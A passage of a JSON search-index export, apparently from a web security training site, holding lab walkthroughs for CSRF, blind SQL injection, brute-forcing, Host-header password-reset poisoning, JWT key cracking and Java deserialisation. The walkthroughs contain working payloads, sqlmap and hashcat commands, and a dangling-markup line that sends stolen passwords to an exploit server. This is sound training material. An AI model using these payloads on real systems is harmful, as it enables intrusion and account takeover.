    "c": "CSRF where token validation depends on token being present  Description  This lab ’s email change functionality is vulnerable to CSRF. Reproduction and proof of concept  Open Burp’s browser and log in to the wiener account. Submit the “Update email” form, and find the resulting request in Proxy history. Send the request to Burp Repeater and check that when changing the value of the csrf parameter, the request is rejected. Delete the csrf parameter entirely to check that the request is now accepted. When using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools -> Generate CSRF PoC . Enable the option to include an auto-submit script and click Regenerate . When using Burp Suite Community Edition, use the following HTML template, and get the request URL by right-clicking and selecting Copy URL . <form method=\"POST\" action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\"> <input type=\"hidden\" name=\"$param1name\" value=\"$param1value\"> </form> <script> document.forms[0].submit(); </script> Go to the exploit server, paste the exploit HTML into the Body field, and click Store . Try it out by clicking View exploit and check the resulting HTTP request and response. Click Deliver to victim . Exploitability  An attacker needs to use the exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. There is an accounts on the application that can be used to design the attack. The credentials are wiener:peter .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fb051c483fd02e4a1f100e0185ffefba",
    "u": "https://webapp.tymyrddin.dev/docs/auth/9",
    "t": "Brute-forcing a stay-logged-in cookie ",
    "c": "Brute-forcing a stay-logged-in cookie  Description  This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. Reproduction and proof of concept  With Burp running, log in with wiener:peter with the Stay logged in option selected. Notice that this sets a stay-logged-in cookie. username=wiener&password=peter&stay-logged-in=on Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770 . Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64 ( username + ':' + md5HashOfPassword ) Log out of your account. Send the most recent GET /my-account request to Burp Intruder. In Burp Intruder, add a payload position to the stay-logged-in cookie and add your own password as a single payload. Under Payload processing , add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted. Hash: MD5 Add prefix: wiener: Encode: Base64-encode As the Update email button is only displayed when you access the /my-account page in an authenticated state, we can use the presence or absence of this button to determine whether we have successfully brute-forced the cookie. On the Options tab, add a grep match rule to flag any responses containing the string Update email . Start the attack. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected, and you were able to construct a valid cookie for your own account. Make the following adjustments and then repeat this attack: Remove your own password from the payload list and add the list of candidate passwords instead. Change the Add prefix rule to add carlos: instead of wiener: . When the attack is finished, the lab will be solved. Notice that only one request returned a response containing Update email . The payload from this request is the valid stay-logged-in cookie for Carlos’s account. Exploitability  An attacker needs to brute-force Carlos’s cookie to gain access to his My account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "278f1bdecf098e36a63e4768f71a0739",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy SQL injection Labs Introduction  What?  SQL injection has been at the top of the OWASP vulnerability listings for many years, the reason being that, if identified and exploited to the full extent, they produce catastrophic outcomes. Why?  SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. How?  SQL injection techniques SQL injection vulnerability in WHERE clause allowing retrieval of hidden data SQL injection vulnerability allowing login bypass SQL injection UNION attack, determining the number of columns returned by the query SQL injection UNION attack, finding a column containing text SQL injection UNION attack, retrieving data from other tables SQL injection UNION attack, retrieving multiple values in a single column SQL injection attack, querying the database type and version on Oracle SQL injection attack, querying the database type and version on MySQL and Microsoft SQL injection attack, listing the database contents on non-Oracle databases SQL injection attack, listing the database contents on Oracle Blind SQL injection with conditional responses Blind SQL injection with conditional errors Blind SQL injection with time delays Blind SQL injection with time delays and information retrieval Blind SQL injection with out-of-band interaction Blind SQL injection with out-of-band data exfiltration SQL injection with filter bypass via XML encoding",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9a7a3adf92944ec6f4d5017cf360083c",
    "u": "https://webapp.tymyrddin.dev/docs/headers/7",
    "t": "Password reset poisoning via dangling markup ",
    "c": "Password reset poisoning via dangling markup  Description  This lab is vulnerable to password reset poisoning via dangling markup. Reproduction  Go to the login page and request a password reset for your own account. Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text. In the proxy history, study the response to the GET /email request. Observe that the HTML content for your email is written to a string, but this is being sanitised using the DOMPurify library before it is rendered by the browser. In the email client, notice that you have the option to view each email as raw HTML instead. Unlike the rendered version of the email, this does not appear to be sanitised in any way. Send the POST /forgot-password request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email: Host: lab-id.web-security-academy.net:arbitraryport In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password. Send the POST /forgot-password request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server: Host: lab-id.web-security-academy.net:'<a href=\"//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/? Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins GET /?/login'>[…] , which contains the rest of the email body, including the new password. In Burp Repeater, send the request one last time, but change the username parameter to carlos . Refresh the access log and obtain Carlos’s new password from the corresponding log entry. Log in as carlos using this new password to solve the lab. PoC  Exploitability  An attacker will need to abuse the vulnerability and log in to Carlos’s account. Any emails sent to wiener:peter can be read via the email client on the exploit server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "581fdb72571f3057c5e6960d56f90641",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy HTTP request smuggling Labs Introduction  What?  HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Why?  Request smuggling vulnerabilities are often critical in nature, and can be exploited to bypass security controls, gain unauthorised access to sensitive data, directly compromise other application users, to conduct phishing attacks, cache poisoning, cross-site scripting (XSS), and more. More information regarding exploiting this vulnerability was published by James Kettle during BlackHAT USA 2019, titled HTTP Desync Attacks: Request Smuggling Reborn . How?  HTTP Request smuggling techniques HTTP request smuggling, basic CL.TE vulnerability HTTP request smuggling, basic TE.CL vulnerability HTTP request smuggling, obfuscating the TE header HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP request smuggling, confirming a TE.CL vulnerability via differential responses Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability Exploiting HTTP request smuggling to reveal front-end request rewriting Exploiting HTTP request smuggling to capture other users’ requests Exploiting HTTP request smuggling to deliver reflected XSS Response queue poisoning via H2.TE request smuggling H2.CL request smuggling HTTP/2 request smuggling via CRLF injection HTTP/2 request splitting via CRLF injection CL.0 request smuggling Exploiting HTTP request smuggling to perform web cache poisoning Exploiting HTTP request smuggling to perform web cache deception Bypassing access controls via HTTP/2 request tunnelling Web cache poisoning via HTTP/2 request tunnelling Client-side desync Browser cache poisoning via client-side desync Server-side pause-based request smuggling",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "43fdee7a8f2a2df36b89875e08891a5d",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/11",
    "t": "Blind SQL injection with conditional responses ",
    "c": "Blind SQL injection with conditional responses  Description  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and no error messages are displayed. But the application includes a “Welcome back” message in the page if the query returns any rows. The database contains a different table called users, with columns called username and password. By exploiting the blind SQL injection vulnerability we can find out the password of the administrator user. Reproduction and proof of concept  Confirm TrackingId parameter is vulnerable: Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Cookie: TrackingId=qKu8R40rq4Hdsfpb; session=2IsD4KyEz4hxnNcI3RdIZbsVggIw71c5 Send to Repeater. Change the TrackingId cookie to: TrackingId=qKu8R40rq4Hdsfpb' AND '1'='1 . The “Welcome back” message appears in the response. Now change it to: TrackingId=qKu8R40rq4Hdsfpb' AND '1'='2 . The “Welcome back” message does not appear in the response. This confirms TrackingId is a vulnerable parameter. Confirm there is a users table. Now change it to: TrackingId=qKu8R40rq4Hdsfpb' AND (SELECT 'a' FROM users LIMIT 1)='a . There is a “Welcome Back” so the condition is true, confirming that there is a table called users . Now confirm that the username administrator exists in the users table. Change the TrackingId parameter to: TrackingId=qKu8R40rq4Hdsfpb' AND (SELECT username FROM users WHERE username='administrator')='administrator'--' “Welcome back”, so the condition is true, confirming that there is a user called administrator . The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: TrackingId=qKu8R40rq4Hdsfpb' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--' Send a series of follow-up values to test different password lengths. Send: TrackingId=qKu8R40rq4Hdsfpb' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>2)='administrator'--' TrackingId=qKu8R40rq4Hdsfpb' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>3)='administrator'--' Etcetera. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the “Welcome back” message disappears), you have determined the length of the password, which is 20 characters long. Request: Response: After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests. Send the request you are working on to Burp Intruder, using the context menu. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the “Clear §” button. I took a break, and the lab timed out. New TrackingId value of tFVVYAOZtT7hz2qi . In the Positions tab, change the value of the cookie to: TrackingId=tFVVYAOZtT7hz2qi' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. The attack will cycle through each position and possible value, testing each one in turn. Place payload position markers around the final a character in the cookie value. To do this, select just the a , and click the “Add §” button: TrackingId=tFVVYAOZtT7hz2qi'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users WHERE+username&3d'administrator')%3d'§a§'-- To test the character at each position, send suitable payloads in the payload position defined. For this lab, assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that “Bruteforcer” is selected, and under “Payload Options” the range a-z and 0-9 are by default set. To be able to tell when the correct character was submitted, grep each response for the expression “Welcome back”. To do this, go to the Options tab, and the “Grep - Match” section. Clear any existing entries in the list, and then add the value “Welcome back”. Launch the attack by clicking the “Start attack” button or selecting “Start attack” from the Intruder menu. Review the attack results to find the value of the character at the first position. You should see a column in the results called “Welcome back”. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position. Re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2 : TrackingId=tFVVYAOZtT7hz2qi'+AND+(SELECT+SUBSTRING(password,2,1)+FROM+users WHERE+username&3d'administrator')%3d'§a§'-- Launch the modified attack, review the results, and note the character at the second offset. Continue this process testing offset 3 , 4 , and so on, until 20 and you have the whole password. In the browser, click “My account” to open the login page. Use the password to log in as the administrator user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6827716778b6cfdb5f37bed067be55dd",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/sql-time",
    "t": "SQL injection: time-based ",
    "c": "SQL injection: time-based  root-me challenge: SQL injection - Time based : Retrieve administrator’s password. members.txt : GET /web-serveur/ch40/?action=member&member=1* HTTP/1.1 Host: challenge01.root-me.org ... Upgrade-Insecure-Requests: 1 sqlmap -r members.txt --risk=3 --level=5 --batch --dbs URI parameter '#1*' is vulnerable. the back-end DBMS is PostgreSQL available databases [1]: [*] public sqlmap -r members.txt --risk=3 --level=1 --batch --dbs -D public --tables Database: public [1 table] +-------+ | users | +-------+ Dump: sqlmap -r members.txt --risk=3 --level=1 --batch --dbs -D public --dump +----+---------------------------+----------+---------------+----------+-----------+ | id | email | lastname | password | username | firstname | +----+---------------------------+----------+---------------+----------+-----------+ | 1 | ycam@sqlitimebased.com | MAC | xxxxxxxxxxxxx | admin | Yann | +----+---------------------------+----------+---------------+----------+-----------+ Resources  Time based blind SQL Injection using heavy queries SQLmap Cheatsheet and Examples",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b599c94a3c73603c18677a8ad443a4ce",
    "u": "https://webapp.tymyrddin.dev/docs/auth/12",
    "t": "Password brute-force via password change ",
    "c": "Password brute-force via password change  Description  This lab ’s password change functionality makes it vulnerable to brute-force attacks. Reproduction and proof of concept  With Burp running, log in with wiener:peter and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request. Notice the behaviour when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states Current password is incorrect . If you enter a valid current password, but two different new passwords, the message says New passwords do not match . We can use this message to enumerate correct passwords. Enter your correct current password and two new passwords that do not match. Send this POST /my-account/change-password request to Burp Intruder. In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example: username=carlos&current-password=§peter§&new-password-1=12345&new-password-2=123456 On the Payloads tab, enter the list of passwords as the payload set On the Options tab, add a grep match rule to flag responses containing New passwords do not match. Start the attack. When the attack finishes, notice that one response was found that contains the New passwords do not match message. Make a note of this password. In the browser, log out of your own account and log back in with the username carlos and the password just identified. Click My account to solve the lab. Exploitability  An attacker will need to use the list of candidate passwords to brute-force Carlos’s account and access his My account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9d28d026d8ca5a9447f0a709eb5463f6",
    "u": "https://webapp.tymyrddin.dev/docs/headers/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy HTTP Host header attacks Labs Introduction  What?  The purpose of the HTTP Host header is to help identify which back-end component the client wants to communicate with. If requests didn’t contain Host headers, or if the Host header was malformed in some way, this could lead to issues when routing incoming requests to the intended application. Historically, this ambiguity didn’t exist because each IP address would only host content for a single domain. Nowadays, largely due to the ever-growing trend for cloud-based solutions and outsourcing much of the related architecture, it is common for multiple websites and applications to be accessible at the same IP address. This approach has also increased in popularity partly as a result of IPv4 address exhaustion. Why?  HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as “Host header injection” attacks. The header value may also be used in a variety of interactions between different systems of the website’s infrastructure. As the Host header is in fact user controllable, this practice can lead to a number of issues. If the input is not properly escaped or validated, the Host header is a potential vector for exploiting a range of other vulnerabilities, most notably: Web cache poisoning, Business logic flaws in specific functionality, Routing-based SSRF, and Classic server-side vulnerabilities, such as SQL injection How?  HTTP Host header attacks Basic password reset poisoning Host header authentication bypass Web cache poisoning via ambiguous requests Routing-based SSRF SSRF via flawed request parsing Host validation bypass via connection state attack Password reset poisoning via dangling markup",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a63e64f78ae317bd8089fee87b5bb0c6",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/jwt",
    "t": "JSON web tokens attacks ",
    "c": "JSON web tokens attacks  JSON Web Tokens (JWT) are one of the most frequently used methods to exchange information with REST APIs. JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. And it is also frequently misconfigured and abused. Steps  Find JWT tokens Identify a test page: Find a request of a page with JWT token which gives a clear response. Profile pages are a good start. Check for test cases on the page: Check if the same token still works (it may have expired) Algorithm manipulation: Using None as the algorithm; or using symmetric encryption (HMAC) instead of asymmetric RSA. Lack of signature validation. Bruteforcing weak secret keys. Secret keys leaking through another attack (like directory traversal , XXE , or SSRF ). Key ID (KID) manipulation: Directory traversals ; SQL injections ; and Command injections . JKU/JWK/x5u/x5c headers used sending rogue keys. Information leaks in JWT when developers mistake base64 encoding for encrypting. Finding JWT tokens  Use Regex to search in proxy history: \"[= ]eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9._-]*\" \"[= ]eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*\" Escalation  The impact of JWT attacks is usually severe. If an attacker is able to create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full control of their accounts. Portswigger labs  JWT authentication bypass via unverified signature JWT authentication bypass via flawed signature verification JWT authentication bypass via weak signing key JWT authentication bypass via jwk header injection JWT authentication bypass via jku header injection JWT authentication bypass via kid header path traversal JWT authentication bypass via algorithm confusion JWT authentication bypass via algorithm confusion with no exposed key Remediation  When issuing a token  Except in very few cases (when used in the client side, for carrying GUI state data and session information) a token is not be issued without a signature. This allows token consumers to trust it and to ensure that it has not been tampered with. Use asymmetric signing algorithms if possible. These simplify the key custody. When choosing a symmetric key signing algorithm, take into account that symmetric key algorithms are vulnerable to brute force attacks if the key isn’t strong enough. A JWT, once signed, is valid forever if no expiration date is given (claim exp ). For Access tokens, anybody capturing the token will have access to the granted operations forever. Assigning identifiers (claim jti ) to tokens allows for their revocation; in case the token is compromised it is very helpful to be able to revoke the token. To ease the management of the tokens to the recipients it is mandatory to identify the issuer ( iss claim) and all possible recipients (claim aud ); with this information it will be easy for recipients to locate the signature key and check the token was issued for them (and it is best practice for recipients to validate these claims). JWTs are not encrypted by default, so care must be taken with the information included inside the token. If sensitive information must be included inside a token, encrypt the JWT. When validating a token  The signature is the only way to verify that the data contained inside the token has not been tampered with. After validating the token format, check that it has a signature, to prevent scenarios in which an adversary intercepts the token, removes the signature, modifies the data and resends it. DO NOT accept tokens with alg: \"none\" in its header. Always validate that the alg claim contains a value from a set of expected values. And the smaller the set, the better. Never trust the received claims, especially when using them for searches in backends. The kid claim can be used for signing key lookup: Sanitise its value to avoid SQL injection attacks. Similarly, the jku (URL to a JWK Set) and x5u (URL to an X.509 certification chain) fields can contain arbitrary urls and cause SSRF attacks if used without proper validation, for example by using a whitelist of allowed URLs. Before accepting a JWT, verify that the token was issued by the expected entity ( iss claim) and that it was issued for the intended audience ( aud claim); this will reduce the risk of an adversary using a token intended for another recipient, and gaining unauthorised access to resources. When looking up the signing key, check that the signing algorithm is valid for the issuer. An adversary could intercept a token using an RS256 algorithm, modify it and create a signature using the public key of the issuer by using a HS256 algorithm. Resources  RFC7519 Portswigger: JWT attacks Portswigger: Working with JWTs in Burp Suite Portswigger: Burpsuite JWT Editor extension JWT Encoder–Decoder JWT Attack Methodology The JSON Web Token Toolkit v2 PayloadsAllTheThings/JSON Web Token Attacking JWT authentication - Sjoerd Langkemper Hacking JSON Web Token (JWT) - Rudra Pratap JWT Writeups Bug Bounty HackerOne (Karim Habeeb)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5867a5ffcd9f292c756f782307b17695",
    "u": "https://webapp.tymyrddin.dev/docs/auth/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Authentication Labs Introduction  What?  The majority of threats related to the authentication process are associated with passwords and password-based authentication methods. Broken authentication also causes a significant amount of vulnerabilities. Why?  As well as potentially allowing attackers direct access to sensitive data and functionality, they also expose additional attack surface for further exploits. How?  Authentication vulnerabilities Username enumeration via different responses 2FA simple bypass Password reset broken logic Username enumeration via subtly different responses Username enumeration via response timing Broken brute-force protection, IP block Username enumeration via account lock 2FA broken logic Brute-forcing a stay-logged-in cookie Offline password cracking Password reset poisoning via middleware Password brute-force via password change Broken brute-force protection, multiple credentials per request 2FA bypass using a brute-force attack",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "12a588cf83af64a30885c67b818761c1",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/3",
    "t": "JWT authentication bypass via weak signing key ",
    "c": "JWT authentication bypass via weak signing key  Description  This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets . Reproduction and proof of concept  Brute-force the secret key  In Burp, load the JWT Editor extension from the BApp store. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Copy the JWT and brute-force the secret. You can do this using hashcat and the wordlist of well-known secrets : hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list If you’re using hashcat, this outputs the JWT, followed by the secret. If everything worked correctly, this should reveal that the weak secret is secret1 . Generate a forged signing key  Using Burp Decoder, Base64 encode the secret that you brute-forced in the previous section. c2VjcmV0MQ== In Burp, go to the JWT Editor Keys tab and click New Symmetric Key . In the dialog, click Generate to generate a new key in JWK format. Note that you don’t need to select a key size as this will automatically be updated later. Replace the generated value for the k property with the Base64-encoded secret. { \"kty\": \"oct\", \"kid\": \"dcae7212-244c-4a69-a24d-5639fdf4d3ed\", \"k\": \"c2VjcmV0MQ==\" } Click OK to save the key. Modify and sign the JWT  Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab. In the payload, change the value of the sub claim to administrator . At the bottom of the tab, click Sign , then select the key that you generated in the previous section. Make sure that the Don't modify header option is selected, then click OK . The modified token is now signed with the correct signature. Send the request and observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; brute-force the website’s secret key; use it to sign a modified session token that gives access to the admin panel at /admin ; then delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6db6d7134351f3e85509f24cce7c8c55",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/8",
    "t": "Developing a custom gadget chain for Java deserialisation ",
    "c": "Developing a custom gadget chain for Java deserialisation  Description  This lab uses a serialisation-based session mechanism. By constructing a suitable gadget chain, it is possible to exploit this lab’s insecure deserialization to obtain the administrator’s password. Reproduction and proof of concept  Identify the vulnerability  Log in with wiener:peter . A new session cookie is generated. This cookie contains a Java Base64-Encoded Object from data.session.token.AccessTokenUsers (package data.session.token ). session=rO0... usr\"data.session.token.AccessTokenUsers The source code contains: <!--/backup/AccessTokenUser.java>Example user--> In the site map of Engagement Tools -> Discover content after running the tool. The website references the file /backup/AccessTokenUser.java . HTTP/1.1 200 OK Set-Cookie: session=; Secure; HttpOnly; SameSite=None X-Frame-Options: SAMEORIGIN Connection: close Content-Length: 486 package data.session.token; import java.io.Serializable; public class AccessTokenUser implements Serializable { private final String username; private final String accessToken; public AccessTokenUser(String username, String accessToken) { this.username = username; this.accessToken = accessToken; } public String getUsername() { return username; } public String getAccessToken() { return accessToken; } } This is the class that the cookie object was serialised from. The backend probably serialises this object with the given credentials and then deserialises it in each request. Send this file to Burp Repeater. The /backup directory also contains a ProductTemplate.java file: HTTP/1.1 200 OK Set-Cookie: session=; Secure; HttpOnly; SameSite=None X-Frame-Options: SAMEORIGIN Connection: close Content-Length: 1651 package data.productcatalog; import common.db.JdbcConnectionBuilder; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; import java.sql.Connection; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Statement; public class ProductTemplate implements Serializable { static final long serialVersionUID = 1L; private final String id; private transient Product product; public ProductTemplate(String id) { this.id = id; } private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException { inputStream.defaultReadObject(); JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from( \"org.postgresql.Driver\", \"postgresql\", \"localhost\", 5432, \"postgres\", \"postgres\", \"password\" ).withAutoCommit(); try { Connection connect = connectionBuilder.connect(30); String sql = String.format(\"SELECT * FROM products WHERE id = '%s' LIMIT 1\", id); Statement statement = connect.createStatement(); ResultSet resultSet = statement.executeQuery(sql); if (!resultSet.next()) { return; } product = Product.from(resultSet); } catch (SQLException e) { throw new IOException(e); } } public String getId() { return id; } public Product getProduct() { return product; } } A vulnerable and exploitable class: The ProductTemplate.readObject() method overrides the default readObject() method and passes a a private variable id set by a public function into a SQL query. Based on the found source code, write a small Java program that instantiates a ProductTemplate with an arbitrary id , serialises it, and then Base64-encodes it. Match the structure the backend uses. A main class calls a package called data.productcatalog . See Code on GitHub . Use the Java program to create a ProductTemplate with the id set to a single apostrophe. Copy the Base64 string and submit it in a request as the session cookie. The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialised object. $ javac Main.java Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true $ java Main Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc= Deserialized object ID: ' Extract the password  Having identified the vulnerability, find a way to exploit it to extract the administrator’s password. Use (one of) these options for testing different payloads: Make changes in the Java file like in the previous step, recompile it, and run it again before pasting the new value into the session cookie. This can be time-consuming as you’ll have to repeat all of these steps for each payload you want to test. Alternatively, you can use the Hackvertor extension . You can then paste the raw serialised object into Burp Repeater and add tags that will update the offsets and Base64-encode the object automatically. This makes it much quicker to test a large number of payloads, and is compatible with Burp Intruder. This template is Base64-encoded here to avoid copy/paste issues: PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+ To use this template: Copy and paste it into the session cookie in Burp Repeater. Base64-decode it to reveal something that looks like this: <@base64_4>¬ísr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode_3><@get_len /><@/from_charcode_3>YOUR-PAYLOAD-HERE<@set_len><@length_0>YOUR-PAYLOAD-HERE<@/length_0><@/set_len><@/base64_4> Replace both occurrences of YOUR-PAYLOAD-HERE with the payload that you want to test. Leave everything else as is. Send the request. When the query causes no error: <p class=is-warning>java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser</p> When an error occurs, something like: <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: syntax error at or near &quot;1&quot; Position: 71 If you want to check the output that Hackvertor generated, you can look at the request on the Logger tab. Trying some random values and analysing the responses: The vulnerability can be exploited by stacked-timebased, time-based and error-based injections, but not boolean-based. Enumerate the number of columns in the table (8). SELECT * FROM products WHERE id = ' UNION SELECT NULL-- <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns Position: 85</p> ... SELECT * FROM products WHERE id = ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: UNION types character varying and integer cannot be matched Position: 85</p> Determine the data type of the columns. Columns 4 , 5 , and 6 do not expect values of type string . Columns 4 and 5 are integers : SELECT * FROM products WHERE id = ' UNION SELECT NULL,NULL,NULL,'a',NULL,NULL,NULL,NULL-- <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;a&quot; Position: 100</p> SELECT * FROM products WHERE id = ' UNION SELECT NULL,NULL,NULL,NULL,'a',NULL,NULL,NULL-- <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;a&quot; Position: 105</p> SELECT * FROM products WHERE id = ' UNION SELECT NULL,NULL,NULL,NULL,NULL,'a',NULL,NULL-- <p class=is-warning>java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser</p> List the contents of the database and identify that there is a table called users with a column called password. Use a suitable SQL injection payload to extract the password from the users table. For example, the following payload will trigger an exception that displays the...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a2fa1ed38be45e310c81bd30c55b898b",
    "u": "https://webapp.tymyrddin.dev/docs/business/3",
    "t": "Inconsistent security controls ",
    "c": "Inconsistent security controls  Description  This lab ’s flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. Reproduction and proof of concept  Open the lab then go to the Target -> Site map tab in Burp. Right-click on the lab domain and select Engagement tools -> Discover content to open the content discovery tool. Click Session is not running to start the content discovery. After a short while, look at the Site map tab in the dialog. Notice that it discovered the path /admin . Try and browse to /admin . Although you don’t have access, the error message indicates that DontWannaCry users do. Go to the account registration page. Notice the message telling DontWannaCry employees to use their company email address. Register with an arbitrary email address in the format: attacker@exploit-0acf004f04439081c1c91280010e0052.exploit-server.net Find your email domain name by clicking the Email client button. Go to the email client and click the link in the confirmation email to complete the registration. Log in using your new account and go to the My account page. Notice that you have the option to change your email address. Change your email address to an arbitrary @dontwannacry.com address. Notice that you now have access to the admin panel, where you can delete Carlos to solve the lab. Exploitability  An attacker will need to access the admin panel and delete Carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb718c2fb92ed71b5c6c191ead14ad1a",
    "u": "https://webapp.tymyrddin.dev/docs/xss/readme",
    "t": "Introduction ",
